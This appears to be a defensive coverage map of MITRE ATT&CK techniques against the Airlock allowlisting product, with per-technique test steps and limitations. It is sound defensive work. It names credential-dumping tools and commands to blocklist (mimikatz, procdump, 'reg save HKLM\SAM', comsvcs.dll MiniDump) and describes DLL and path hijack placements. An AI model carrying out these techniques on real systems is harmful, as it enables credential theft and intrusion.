Hijack execution flow - DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc).

**Test:** Place untrusted DLL in trusted app directory -> DLL blocked at load.

**Limitations:** Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory - not caught. Trusted-signed DLLs pass publisher trust.

### T1574.001 - DLL
**Yes** 🟢 | DLL-control | Testable: yes

DLL search order hijacking. Malicious DLL in app directory. Must be trusted.

**Test:** Unsigned DLL with legitimate name in app dir -> blocked.

**Limitations:** Strongest control against common malware technique.

### T1574.005 - Executable Installer File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Executable installer file perms weakness. Replacement must be trusted.

**Test:** Replace installer exe with unsigned -> blocked on service restart.

**Limitations:** File replacement itself is OS permissions issue.

### T1574.007 - Path Interception by PATH Environment Variable
**Yes** 🟢 | default-deny | Testable: yes

Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted.

**Test:** Unsigned exe named common_tool.exe in PATH dir -> blocked.

**Limitations:** If placed in path-trusted directory, may run.

### T1574.008 - Path Interception by Search Order Hijacking
**Yes** 🟢 | default-deny | Testable: yes

Path interception by search order. Same principle as .007.

**Test:** Unsigned exe in directory searched before legitimate -> blocked.

**Limitations:** Path rule coverage important.

### T1574.009 - Path Interception by Unquoted Path
**Yes** 🟢 | default-deny | Testable: yes

Unquoted path interception. Attacker places exe at shorter path. Must be trusted.

**Test:** Unquoted 'C:\Program Files\App\svc.exe' -> place C:\Program.exe (unsigned) -> blocked.

**Limitations:** Classic technique caught cleanly.

### T1574.010 - Services File Permissions Weakness
**Yes** 🟢 | default-deny | Testable: partial

Services file perms weakness. Replace service binary. Must be trusted.

**Test:** Replace service binary with unsigned -> restart blocked.

**Limitations:** File replacement is OS perms issue.

### T1574.011 - Services Registry Permissions Weakness
**Yes** 🟢 | default-deny | Testable: yes

Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted.

**Test:** Modify service ImagePath to unsigned exe -> start blocked.

**Limitations:** Reg mod not prevented.

### T1574.012 - COR_PROFILER
**Yes** 🟢 | DLL-control | Testable: yes

COR_PROFILER .NET profiler DLL. Must be trusted.

**Test:** Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts.

**Limitations:** Env var mod not prevented.

### T1574.013 - KernelCallbackTable
**No** ⚪ | none

KernelCallbackTable. In-memory manipulation of trusted process.

**Test:** N/A - in-memory. EDR territory.

### T1574.014 - AppDomainManager
**Yes** 🟢 | DLL-control | Testable: yes

AppDomainManager injection. .NET config loads attacker DLL. Must be trusted.

**Test:** Malicious .config pointing to untrusted DLL -> blocked.

**Limitations:** Config file modification not prevented.

### T1620 - Reflective Code Loading
**Yes** 🟢 | blocklist (predefined) + blocklist-metarule + default-deny | Testable: yes

Reflective code loading relies on a loader process to invoke reflection (e.g., MSBuild, InstallUtil, RegAsm, PowerShell via Assembly.Load, custom .NET harnesses). Airlock blocks/blocklists the loader binaries. MSBuild, InstallUtil, RegAsm covered by predefined LOLBAS blocklist packages. PowerShell restrictable via metarule. Custom loader executables blocked by default-deny. The reflected assembly itself may never touch disk, but the process performing the reflection is controllable.

**Test:** 1) Blocklist MSBuild/InstallUtil/RegAsm via predefined LOLBAS package - loader can't run. 2) Blocklist PowerShell for non-admins - prevents Assembly.Load via PS. 3) Custom .NET reflection harness exe - blocked by default-deny (untrusted). 4) execute-assembly style attack requires attacker tooling on disk - blocked.

**Limitations:** If reflection occurs inside an already-trusted, non-blocklistable process via API calls, Airlock has no visibility into the in-memory assembly. That is EDR + memory protection territory.

### T1622 - Debugger Evasion
**No** ⚪ | default-deny (indirect) | Testable: yes

Debugger evasion. If malware untrusted, blocked before check.

### T1656 - Impersonation
**No** ⚪ | none

Impersonation (social). Pretending to be someone. Social engineering.

### T1672 - Email Spoofing
**No** ⚪ | none

Email spoofing. Email-level technique.

### T1678 - Delay Execution
**No** ⚪ | default-deny | Testable: yes

Delay execution (sleep/timer). If malware is untrusted, blocked whenever it tries to execute regardless of delay.

**Limitations:** Delayed malware still blocked.

### T1679 - Selective Exclusion
**No** ⚪ | none

Selective exclusion. Malware selectively targeting systems. Behavioral.


## CREDENTIAL-ACCESS (53 techniques - 13 covered)

### T1003 - OS Credential Dumping
**Yes** 🟢 | default-deny + blocklist-metarule + predefined-blocklist | Testable: yes

Untrusted dumping tools (mimikatz, secretsdump) blocked by default-deny. Built-in tools usable for credential dumping (procdump, reg.exe for SAM export) can be restricted via blocklist metarules. comsvcs.dll MiniDump via rundll32: DLL control ensures comsvcs.dll must be trusted, but it ships with Windows and is trusted. Restricting rundll32 for non-admins via metarule is possible but aggressive. Predefined Microsoft Recommended Block Rules covers many credential tools.

**Test:** 1) mimikatz.exe -> blocked (untrusted). 2) Blocklist procdump.exe by original_filename. 3) reg.exe restrictable for non-admins via metarule. 4) Import Microsoft Recommended Block Rules. 5) Credential Guard recommended for LSASS protection.

**Limitations:** Admin users exempted from metarule can still use these tools. Credential Guard is complementary control for LSASS protection.

### T1003.001 - LSASS Memory
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

LSASS memory dump tools blocked (mimikatz untrusted, procdump blocklistable). comsvcs.dll MiniDump via rundll32: both are trusted Windows components. Restricting rundll32 for non-admins via metarule is possible but aggressive and may break legitimate functionality. Task Manager dump requires interactive admin session. Credential Guard is the definitive LSASS protection control.

**Test:** 1) mimikatz -> blocked. 2) Blocklist procdump by original_filename. 3) Credential Guard for defense-in-depth. 4) Rundll32 restriction for non-admins: test in audit mode first.

**Limitations:** Admin-exempted users can still dump. Credential Guard is the definitive LSASS control.

### T1003.002 - Security Account Manager
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone SAM dump tools blocked by default-deny. SAM export via reg.exe (reg save HKLM\SAM): reg.exe is a core Windows utility that cannot be practically blocklisted. Technique is achievable with built-in tools.

**Test:** Standalone SAM dump tool -> blocked (untrusted). reg.exe save -> succeeds (trusted, cannot be blocklisted).

**Limitations:** reg.exe cannot be practically blocklisted. Credential Guard and SAM encryption are complementary controls.

### T1003.003 - NTDS
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

ntdsutil.exe: restrict via blocklist metarule for non-admins. Standalone tools blocked.

**Test:** 1) Standalone tool -> blocked. 2) Blocklist ntdsutil.exe for non-admins.

**Limitations:** DC-focused. Admin users on DC need ntdsutil for legitimate operations - scope metarule carefully.

### T1003.004 - LSA Secrets
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone LSA secrets dump tools blocked by default-deny. reg.exe for registry export cannot be practically blocklisted.

**Test:** Standalone dump tool -> blocked. reg.exe -> succeeds (cannot be blocklisted).

**Limitations:** reg.exe cannot be practically blocklisted.

### T1003.005 - Cached Domain Credentials
**No** ⚪ | none

Cached domain credentials. Accessed via trusted tools/APIs.

### T1003.006 - DCSync
**No** ⚪ | none

DCSync. Uses Active Directory replication protocol. No file execution, just network/AD operations.

**Limitations:** If DCSync tool (mimikatz) is untrusted, tool blocked.

### T1040 - Network Sniffing
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. Built-in pktmon.exe restrictable via blocklist metarule.

**Test:** 1) Wireshark not allowlisted -> blocked. 2) Blocklist pktmon.exe for non-admins.

**Limitations:** Network-level captures via other means (port mirroring) outside scope.

### T1056 - Input Capture
**No** ⚪ | default-deny (tool) | Testable: partial

Keylogger as standalone tool blocked. DLL-based keylogger DLL blocked. But keylogging achievable via trusted process API hooks or in-process techniques.

**Test:** Standalone keylogger exe -> blocked. Keylogger DLL -> blocked.

**Limitations:** In-process keylogging via trusted process not caught. EDR territory.

### T1056.001 - Keylogging
**No** ⚪ | default-deny + DLL-control | Testable: partial

Standalone keylogger tools/DLLs blocked. But technique achievable with in-process hooks from trusted code.

**Test:** Keylogger exe -> blocked. Keylogger DLL -> blocked.

**Limitations:** In-process API-level keylogging not caught.

### T1056.002 - GUI Input Capture
**No** ⚪ | none

GUI input capture. Fake dialog boxes from trusted processes. In-process.

### T1056.003 - Web Portal Capture
**No** ⚪ | none

Web portal capture. Server-side/web-level.

### T1056.004 - Credential API Hooking
**No** ⚪ | DLL-control | Testable: partial

Credential API hooking DLL must be trusted to load. But hooking achievable from within trusted process.

**Test:** Untrusted hooking DLL -> blocked.

**Limitations:** In-process hooking not caught.

### T1110 - Brute Force
**No** ⚪ | none

Brute force. Network-based credential attacks. No file execution on target.

**Limitations:** If brute force tool is untrusted, tool blocked.

### T1110.001 - Password Guessing
**No** ⚪ | none

Password guessing. Network-level.

### T1110.002 - Password Cracking
**Yes** 🟢 | default-deny | Testable: yes

Password cracking tools (hashcat, john) must be trusted. Blocked by default-deny.

**Test:** hashcat.exe, john.exe not allowlisted -> blocked.

**Limitations:** Typically offline attack. Tools must be on the endpoint to be relevant.

### T1110.003 - Password Spraying
**No** ⚪ | none

Password spraying. Network-level.

### T1110.004 - Credential Stuffing
**No** ⚪ | none

Credential stuffing. Network-level.

### T1111 - Multi-Factor Authentication Interception
**No** ⚪ | none

MFA interception. Identity/protocol level.

### T1187 - Forced Authentication
**No** ⚪ | none

Forced authentication. Triggering NTLM auth via UNC paths. No file execution.

### T1212 - Exploitation for Credential Access
**No** ⚪ | default-deny | Testable: partial

Exploitation for credential access is about abusing a vulnerability to obtain credentials. The exploit itself runs inside a trusted process or against a service. Airlock doesn't detect or prevent exploits.

**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.

### T1539 - Steal Web Session Cookie
**No** ⚪ | none

Steal web session cookie. Browser data access. No new file execution typically.

**Limitations:** If cookie stealer tool is untrusted, blocked.

### T1552 - Unsecured Credentials
**No** ⚪ | none

Unsecured credentials (parent). Reading files/registry for credentials. Data access via trusted tools.

### T1552.001 - Credentials In Files
**No** ⚪ | none

Credentials in files. Reading files. Data operation.

### T1552.002 - Credentials in Registry
**No** ⚪ | none

Credentials in registry. reg query. Trusted tool.

### T1552.003 - Shell History
**No** ⚪ | none

Shell history. Reading history files. Data operation.

### T1552.004 - Private Keys
**No** ⚪ | none

Private keys. Reading key files. Data operation.

### T1552.006 - Group Policy Preferences
**No** ⚪ | none

Group policy preferences. Reading GPP XML. Data operation.

### T1555 - Credentials from Password Stores
**No** ⚪ | none

Credentials from password stores. Accessing browser/OS credential stores via trusted tools/APIs.

**Limitations:** If standalone cred extraction tool is untrusted, blocked.

### T1555.003 - Credentials from Web Browsers
**No** ⚪ | none

Credentials from web browsers. Browser data access.

### T1555.004 - Windows Credential Manager
**No** ⚪ | none

Windows credential manager. API-based access.

### T1555.005 - Password Managers
**No** ⚪ | none

Password managers. Application-level access.

### T1556 - Modify Authentication Process
**No** ⚪ | none (sub-technique dependent)

Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading.

**Test:** See sub-techniques.

### T1556.001 - Domain Controller Authentication
**Yes** 🟢 | DLL-control | Testable: yes

Domain controller auth DLL. Password filter loaded by lsass. Must be trusted.

**Test:** Untrusted password filter DLL on DC -> blocked.

**Limitations:** DC/server focused.

### T1556.002 - Password Filter DLL
**Yes** 🟢 | DLL-control | Testable: yes

Password filter DLL. Loaded by lsass on password change. Must be trusted.

**Test:** Untrusted password filter DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1556.005 - Reversible Encryption
**No** ⚪ | none

Reversible encryption. AD policy change. No file execution.

**Limitations:** AD security.

### T1556.006 - Multi-Factor Authentication
**No** ⚪ | none

MFA interception. Identity plane.

**Limitations:** MFA security.

### T1556.007 - Hybrid Identity
**No** ⚪ | none

Hybrid identity. Cloud/identity plane.

### T1556.008 - Network Provider DLL
**Yes** 🟢 | DLL-control | Testable: yes

Network provider DLL. Loaded at logon. Must be trusted.

**Test:** Untrusted network provider DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1557 - Adversary-in-the-Middle
**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes

AitM tools (Responder, Inveigh, ettercap, bettercap) must be trusted. Blocked by default-deny. Inveigh as PS script: restricted by script control + PS blocklist for non-admins.

**Test:** 1) Responder.exe -> blocked (untrusted). 2) Inveigh.ps1 -> blocked by script control. 3) Blocklist PS for non-admins -> prevents Inveigh via PS.

### T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay
**Yes** 🟢 | default-deny + script-control + blocklist-metarule | Testable: yes

LLMNR/NBT-NS poisoning tools blocked by default-deny. Inveigh restricted by script control + PS blocklist.

**Test:** Responder -> blocked. Inveigh.ps1 -> script control. Blocklist PS for non-admins.

### T1557.002 - ARP Cache Poisoning
**Yes** 🟢 | default-deny | Testable: yes

ARP spoofing tools (arpspoof, ettercap, bettercap) must be trusted. Blocked by default-deny.

**Test:** ARP spoofing tool not allowlisted -> blocked.

**Limitations:** No built-in Windows ARP spoofing capability.

### T1557.003 - DHCP Spoofing
**No** ⚪ | none

DHCP spoofing. Network-level.

### T1558 - Steal or Forge Kerberos Tickets
**No** ⚪ | none

Steal/forge Kerberos tickets. Network/AD protocol operations.

**Limitations:** If Kerberoasting tool is untrusted, tool blocked.

### T1558.001 - Golden Ticket
**No** ⚪ | default-deny | Testable: partial

Kerberos ticket forgery achievable with trusted tools/APIs. Mimikatz blocked.

**Test:** mimikatz -> blocked.

**Limitations:** Technique achievable with trusted tools.

### T1558.002 - Silver Ticket
**No** ⚪ | default-deny | Testable: partial

Same as golden ticket.

**Test:** Tool -> blocked.

### T1558.003 - Kerberoasting
**No** ⚪ | none

Kerberoasting. Can be done with trusted PowerShell + .NET.

**Limitations:** Trusted interpreter + API = not caught.

### T1558.004 - AS-REP Roasting
**No** ⚪ | none

AS-REP roasting. Same principle as Kerberoasting.

### T1606 - Forge Web Credentials
**No** ⚪ | none

Forge web credentials. Token/cookie forgery. No file execution.

### T1606.001 - Web Cookies
**No** ⚪ | none

Web cookies. Forgery. No file execution.

### T1606.002 - SAML Tokens
**No** ⚪ | none

SAML tokens. Identity plane.

### T1621 - Multi-Factor Authentication Request Generation
**No** ⚪ | none

MFA request generation (MFA fatigue). Identity/social engineering.

### T1649 - Steal or Forge Authentication Certificates
**No** ⚪ | none

Steal/forge auth certificates. Certificate operations.


## DISCOVERY (42 techniques - 21 covered)

### T1007 - System Service Discovery
**No** ⚪ | none

System service discovery via sc.exe (sc query), Get-Service, or WMI. sc.exe is a core Windows utility used by installers and services - cannot be practically blocklisted. No common standalone attacker tool for this technique.

### T1010 - Application Window Discovery
**No** ⚪ | none

Application window discovery. API-based enumeration.

### T1012 - Query Registry
**No** ⚪ | none

Registry querying via reg.exe (reg query) or PowerShell. reg.exe cannot be practically blocklisted. Data read operation.

### T1016 - System Network Configuration Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

ipconfig.exe, route.exe, arp.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist ipconfig.exe, route.exe, arp.exe for non-admins.

**Limitations:** PowerShell networking cmdlets available if PS trusted. These are aggressive blocks - evaluate operational impact.

### T1016.001 - Internet Connection Discovery
**No** ⚪ | none

Internet connection discovery. Testing connectivity. Trusted tools.

### T1016.002 - Wi-Fi Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

netsh.exe (netsh wlan show) restrictable via blocklist metarule.

**Test:** Blocklist netsh.exe for non-admins.

### T1018 - Remote System Discovery
**Yes** 🟢 | default-deny | Testable: yes

Remote system discovery is achievable with built-in tools (net view, ping, nslookup, arp) that cannot be practically blocklisted. However, standalone enumeration tools commonly used by attackers (AdFind, nmap, masscan, BloodHound/SharpHound, Angry IP Scanner) are blocked by default-deny as untrusted executables.

**Test:** Drop AdFind.exe or SharpHound.exe on endpoint -> blocked (untrusted). nmap.exe -> blocked.

**Limitations:** Built-in tools (net view, ping, nslookup) cannot be practically blocklisted and achieve the same discovery.

### T1033 - System Owner/User Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

whoami.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist whoami.exe for non-admins.

**Limitations:** Environment variables and PowerShell alternatives available if PS trusted.

### T1040 - Network Sniffing
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone capture tools (Wireshark, tcpdump, windump) blocked by default-deny. Built-in pktmon.exe restrictable via blocklist metarule.

**Test:** 1) Wireshark not allowlisted -> blocked. 2) Blocklist pktmon.exe for non-admins.

**Limitations:** Network-level captures via other means (port mirroring) outside scope.

### T1046 - Network Service Discovery
**Yes** 🟢 | default-deny + blocklist-metarule | Testable: yes

Standalone scanning tools (nmap, masscan) blocked by default-deny. PowerShell Test-NetConnection available but PS itself can be blocklisted for non-admins.

**Test:** 1) nmap -> blocked. 2) Blocklist PS for non-admins to prevent Test-NetConnection scanning.

**Limitations:** Basic network tools (ping, nslookup) hard to blocklist without breaking operations.

### T1049 - System Network Connections Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

netstat.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist netstat.exe for non-admins.

**Limitations:** PowerShell Get-NetTCPConnection available if PS trusted.

### T1057 - Process Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

tasklist.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist tasklist.exe for non-admins.

**Limitations:** PowerShell Get-Process available if PS trusted.

### T1069 - Permission Groups Discovery
**Yes** 🟢 | default-deny | Testable: yes

Permission group discovery is achievable with built-in tools (net group, net localgroup) that cannot be practically blocklisted. However, standalone enumeration tools (SharpHound, AdFind, BloodHound) are blocked by default-deny.

**Test:** Drop SharpHound.exe or AdFind.exe -> blocked (untrusted).

**Limitations:** Built-in net.exe and PowerShell AD cmdlets achieve the same discovery.

### T1069.001 - Local Groups
**No** ⚪ | none

Local group discovery via net localgroup. Same net.exe impracticality. PowerShell Get-LocalGroupMember available.

### T1069.002 - Domain Groups
**Yes** 🟢 | default-deny | Testable: yes

Domain group discovery is achievable with built-in tools (net group /domain) that cannot be practically blocklisted. However, standalone domain enumeration tools (SharpHound, AdFind) are blocked by default-deny.

**Test:** SharpHound.exe / AdFind.exe -> blocked (untrusted).

**Limitations:** Built-in net.exe and PowerShell Get-ADGroupMember achieve the same discovery.

Domain group discovery via net group. Same net.exe impracticality. PowerShell Get-ADGroupMember available.

### T1082 - System Information Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

systeminfo.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist systeminfo.exe for non-admins.

**Limitations:** WMI queries (via trusted wmic or PS) can retrieve same info if not blocklisted.

### T1083 - File and Directory Discovery
**No** ⚪ | none

File and directory discovery. dir, Get-ChildItem. Trusted.

### T1087 - Account Discovery
**Yes** 🟢 | default-deny | Testable: yes

Account discovery is achievable with built-in tools (net user) that cannot be practically blocklisted. However, standalone enumeration tools (SharpHound, AdFind, BloodHound) are blocked by default-deny.

**Test:** SharpHound.exe / AdFind.exe -> blocked (untrusted).

**Limitations:** Built-in net.exe and PowerShell Get-LocalUser/Get-ADUser achieve the same discovery.

### T1087.001 - Local Account
**No** ⚪ | none

Local account discovery via net user. Same net.exe impracticality.

### T1087.002 - Domain Account
**Yes** 🟢 | default-deny | Testable: yes

Domain account discovery is achievable with built-in tools (net user /domain) that cannot be practically blocklisted. However, standalone domain enumeration tools (SharpHound, AdFind) are blocked by default-deny.

**Test:** SharpHound.exe / AdFind.exe -> blocked (untrusted).

**Limitations:** Built-in net.exe and PowerShell Get-ADUser achieve the same discovery.

Domain account discovery via net user /domain. Same net.exe impracticality.

### T1087.003 - Email Account
**No** ⚪ | none

Email account discovery. Trusted tools/APIs.

### T1120 - Peripheral Device Discovery
**No** ⚪ | none

Peripheral device discovery. Trusted tools/APIs.

### T1124 - System Time Discovery
**No** ⚪ | none

System time discovery. w32tm, time. Trusted.

### T1135 - Network Share Discovery
**Yes** 🟢 | default-deny | Testable: yes

Network share discovery is achievable with built-in tools (net share, net view) that cannot be practically blocklisted. However, standalone share enumeration tools (ShareFinder, SoftPerfect Network Scanner, PowerView as compiled exe) are blocked by default-deny.

**Test:** ShareFinder.exe / SoftPerfect scanner -> blocked (untrusted).

**Limitations:** Built-in net.exe and PowerShell Get-SmbShare achieve the same discovery.

### T1201 - Password Policy Discovery
**No** ⚪ | none

Password policy discovery via net accounts. net.exe cannot be practically blocklisted.

### T1217 - Browser Information Discovery
**No** ⚪ | none

Browser information discovery. Reading browser data. Data operation.

### T1482 - Domain Trust Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

nltest.exe and dsquery.exe: restrict via blocklist metarule for non-admins.

**Test:** Blocklist nltest.exe and dsquery.exe for non-admins.

**Limitations:** PowerShell Get-ADTrust available if PS trusted.

### T1497 - Virtualization/Sandbox Evasion
**No** ⚪ | default-deny (indirect) | Testable: yes

VM/sandbox evasion checks. If malware is untrusted, blocked before it can check.

### T1497.001 - System Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

System checks. Same.

**Test:** Same.

### T1497.002 - User Activity Based Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

User activity checks. Same.

**Test:** Same.

### T1497.003 - Time Based Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

Time based checks. Same.

**Test:** Same.

### T1518 - Software Discovery
**No** ⚪ | none

Software discovery. Reading installed software. Data operation.

### T1518.001 - Security Software Discovery
**No** ⚪ | none

Security software discovery. Same.

### T1518.002 - Backup Software Discovery
**No** ⚪ | none

Backup software discovery. Same.

### T1614 - System Location Discovery
**No** ⚪ | none

System location discovery. Trusted tools/APIs.

### T1614.001 - System Language Discovery
**No** ⚪ | none

System language discovery. Same.

### T1615 - Group Policy Discovery
**Yes** 🟢 | blocklist-metarule | Testable: yes

gpresult.exe restrictable via blocklist metarule for non-admins.

**Test:** Blocklist gpresult.exe for non-admins.

### T1622 - Debugger Evasion
**No** ⚪ | default-deny (indirect) | Testable: yes

Debugger evasion. If malware untrusted, blocked before check.

### T1652 - Device Driver Discovery
**No** ⚪ | none

Device driver discovery. Trusted tools.

### T1654 - Log Enumeration
**No** ⚪ | none

Log enumeration. Reading logs. Data operation.

### T1673 - Virtual Machine Discovery
**No** ⚪ | none

Virtual machine discovery. Checking VM indicators. Behavioral.

### T1680 - Local Storage Discovery
**No** ⚪ | none

Local storage discovery. Enumerating storage. Data operation.


## LATERAL-MOVEMENT (17 techniques - 10 covered)

### T1021 - Remote Services
**Yes** 🟢 | default-deny (on target) | Testable: yes

Remote access to target. Post-access, any untrusted tools attacker tries to run are blocked by Airlock on the target endpoint.

**Test:** Attacker RDPs/SSHs to target, runs unsigned tool -> blocked.

**Limitations:** Access mechanism itself not prevented. Airlock's value is enforcement on the target.

### T1021.001 - Remote Desktop Protocol
**No** ⚪ | none

RDP is a built-in Windows feature. Airlock doesn't prevent or control RDP access. Post-access, Airlock enforces on any tools the attacker runs on the target, but that's default-deny working normally, not a specific control for RDP.

**Limitations:** RDP access control is handled by network segmentation, firewall rules, and identity/MFA. Airlock's value post-RDP is execution control on the target endpoint.

### T1021.002 - SMB/Windows Admin Shares
**Yes** 🟢 | default-deny + blocklist | Testable: yes

SMB/Windows admin shares. Tools like PsExec push service binaries via SMB. Binary must be trusted on target. PsExec blocklisted.

**Test:** PsExec via SMB -> PSEXESVC.exe blocked on target. Attacker copies malware via \\target\C$ -> execution blocked.

**Limitations:** File copy succeeds. Execution blocked.

### T1021.003 - Distributed Component Object Model
**Yes** 🟢 | default-deny + DLL-control | Testable: yes

DCOM. Remote COM execution. Payload on remote host must be trusted. DLLs must be trusted.

**Test:** DCOM executing untrusted payload on remote host -> blocked.

**Limitations:** DCOM using trusted binaries succeeds.

### T1021.005 - VNC
**Yes** 🟢 | default-deny | Testable: partial

VNC server must be allowlisted on target to run. Unauthorized VNC installation blocked.

**Test:** VNC server exe not allowlisted -> blocked.

**Limitations:** If VNC is legitimately deployed and trusted, attacker with credentials has access.

### T1021.006 - Windows Remote Management
**Yes** 🟢 | default-deny | Testable: yes

WinRM commands execute on remote target. Any binary/script the command invokes must be trusted on target.

**Test:** WinRM executing untrusted binary on target -> blocked.

**Limitations:** Inline PS commands via WinRM on trusted PS succeed. Execution of untrusted files is blocked.

### T1072 - Software Deployment Tools
**Yes** 🟢 | default-deny | Testable: partial

Deployment tools (SCCM, PDQ) are trusted. If compromised to push malicious payloads, payload must still pass default-deny on target endpoint. Untrusted binary blocked at execution regardless of delivery method.

**Test:** Push unsigned exe via SCCM to endpoint -> deployed successfully, blocked at execution.

**Limitations:** If deployment tool configured as trusted parent process, audit process trust rules carefully. Payloads signed by trusted publisher pass publisher trust.

### T1080 - Taint Shared Content
**Yes** 🟢 | default-deny + script-control | Testable: yes

Taint shared content. Placing malicious files on network shares. When victim executes file, Airlock blocks untrusted payload.

**Test:** Malicious exe on share -> victim double-clicks -> blocked.

**Limitations:** File placement not prevented. Execution on victim blocked.

### T1091 - Replication Through Removable Media
**Yes** 🟢 | default-deny + script-control | Testable: yes

Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked.

**Test:** Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked.

**Limitations:** USB device insertion not prevented. Only execution of untrusted files.

### T1210 - Exploitation of Remote Services
**No** ⚪ | default-deny (on target) | Testable: partial

Exploitation of remote services is about abusing a vulnerability in a remote service (e.g., SMB, RDP, SQL). The exploit targets the service itself. Airlock doesn't prevent exploits. Post-exploitation tool deployment on the target is covered under execution techniques.

**Limitations:** Patching, network segmentation, and EDR are the controls.

### T1534 - Internal Spearphishing
**Yes** 🟢 | default-deny + script-control | Testable: yes

Internal spearphishing. Phishing from compromised internal account. Payload must be trusted.

**Test:** Internal phishing email with malicious attachment -> blocked on victim.

**Limitations:** Email delivery not prevented.

### T1550 - Use Alternate Authentication Material
**No** ⚪ | none

Use alternate auth material (parent). Credential reuse. Identity plane.

**Limitations:** Post-auth, tools attacker runs are checked.

### T1550.002 - Pass the Hash
**No** ⚪ | none

Pass the hash. Credential technique. No new file execution required if using trusted tools.

**Limitations:** If PtH tool (mimikatz) is untrusted, tool itself blocked.

### T1550.003 - Pass the Ticket
**No** ⚪ | none

Pass the ticket. Same as PtH.

### T1563 - Remote Service Session Hijacking
**No** ⚪ | none

Remote service session hijacking. Taking over existing session. No new file execution.

### T1563.002 - RDP Hijacking
**No** ⚪ | none

RDP hijacking. Session takeover. No new file execution.

**Limitations:** Post-hijack, Airlock enforces.

### T1570 - Lateral Tool Transfer
**Yes** 🟢 | default-deny | Testable: yes

Lateral tool transfer - file copy to remote host succeeds (Airlock doesn't prevent file writes). But execution of transferred tool on target is blocked if untrusted.

**Test:** Copy malware to \\target\C$\Temp -> succeeds. Attempt to run on target -> blocked.

**Limitations:** File transfer not prevented. Execution is the control point.


## COLLECTION (32 techniques - 4 covered)

### T1005 - Data from Local System
**No** ⚪ | none

Data from local system. Reading files. Data operation.

**Limitations:** If collection tool is untrusted, blocked.

### T1025 - Data from Removable Media
**No** ⚪ | none

Data from removable media. Reading USB. Data operation.

### T1039 - Data from Network Shared Drive
**No** ⚪ | none

Data from network shared drive. Reading shares. Data operation.

### T1056 - Input Capture
**No** ⚪ | default-deny (tool) | Testable: partial

Keylogger as standalone tool blocked. DLL-based keylogger DLL blocked. But keylogging achievable via trusted process API hooks or in-process techniques.

**Test:** Standalone keylogger exe -> blocked. Keylogger DLL -> blocked.

**Limitations:** In-process keylogging via trusted process not caught. EDR territory.

### T1056.001 - Keylogging
**No** ⚪ | default-deny + DLL-control | Testable: partial

Standalone keylogger tools/DLLs blocked. But technique achievable with in-process hooks from trusted code.

**Test:** Keylogger exe -> blocked. Keylogger DLL -> blocked.

**Limitations:** In-process API-level keylogging not caught.

### T1056.002 - GUI Input Capture
**No** ⚪ | none

GUI input capture. Fake dialog boxes from trusted processes. In-process.

### T1056.003 - Web Portal Capture
**No** ⚪ | none

Web portal capture. Server-side/web-level.

### T1056.004 - Credential API Hooking
**No** ⚪ | DLL-control | Testable: partial

Credential API hooking DLL must be trusted to load. But hooking achievable from within trusted process.

**Test:** Untrusted hooking DLL -> blocked.

**Limitations:** In-process hooking not caught.

### T1074 - Data Staged
**No** ⚪ | none

Data staged. Collecting data to staging location. Data operation.

### T1074.001 - Local Data Staging
**No** ⚪ | none

Local data staging. Same.

### T1074.002 - Remote Data Staging
**No** ⚪ | none

Remote data staging. Same.

### T1113 - Screen Capture
**No** ⚪ | default-deny (tool) | Testable: partial

Standalone screenshot tool blocked. Built-in Snipping Tool/PowerShell trusted.

**Test:** Untrusted tool -> blocked.

**Limitations:** Built-in tools succeed.

### T1114 - Email Collection
**No** ⚪ | none

Email collection. Reading emails. Data operation.

### T1114.001 - Local Email Collection
**No** ⚪ | none

Local email collection. Data operation.

### T1114.002 - Remote Email Collection
**No** ⚪ | none

Remote email collection. Network/API operation.

### T1114.003 - Email Forwarding Rule
**No** ⚪ | none

Email forwarding rule. Config operation.

### T1115 - Clipboard Data
**No** ⚪ | none

Clipboard data. API-based access from trusted process.

### T1119 - Automated Collection
**No** ⚪ | default-deny (tool) | Testable: partial

Automated collection scripts must be trusted. But technique achievable with trusted PowerShell scripts.

**Test:** Untrusted collection script -> blocked.

**Limitations:** Trusted PS scripts succeed.

### T1123 - Audio Capture
**No** ⚪ | default-deny (tool) | Testable: partial

Standalone audio capture tool blocked. Trusted tools/APIs succeed.

**Test:** Untrusted tool -> blocked.

### T1125 - Video Capture
**No** ⚪ | default-deny (tool) | Testable: partial

Standalone video capture tool blocked. Trusted tools/APIs succeed.

**Test:** Untrusted tool -> blocked.

### T1185 - Browser Session Hijacking
**No** ⚪ | browser-extension-control (partial) | Testable: partial

Browser session hijacking. In-browser or extension-based. Malicious extension install blocked by browser extension control, but technique achievable via trusted extensions or in-page JS.

**Test:** Malicious extension -> install blocked.

